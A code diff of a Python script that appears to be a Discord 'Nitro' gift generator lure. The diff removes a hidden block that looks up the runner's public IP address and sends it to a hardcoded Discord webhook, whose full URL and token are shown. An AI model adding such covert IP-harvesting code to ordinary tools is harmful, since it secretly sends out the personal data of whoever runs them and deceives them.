@@ -2,9 +2,7 @@ import random, string
 import webbrowser
 import time
 import requests
-import discord_webhook
-import socket
-from discord_webhook import DiscordWebhook, DiscordEmbed
+
 
 print("""
 ███╗░░██╗██╗████████╗██████╗░░█████╗░░░░░░░░██████╗░██╗███████╗████████╗
@@ -65,13 +63,3 @@ input("4")
 input("3")
 input("2")
 input("1")
-
-ip = 'https://api.ipify.org/' 
-output = requests.get(ip).text
-
-webhook = DiscordWebhook(url='https://discord.com/api/webhooks/835882098622988328/UF7kJ-DMG_9_5LVv29qGGSbwfzH8vuKVOq6HYl-WurX5GpL-VFDAz4EewEJ8S-V-AxZR')
-embed = DiscordEmbed(title='New registered ip', description=output, color=65280)
-embed.set_footer(text='Credits: Matty#8952')
-embed.set_timestamp()
-webhook.add_embed(embed)
-response = webhook.execute()
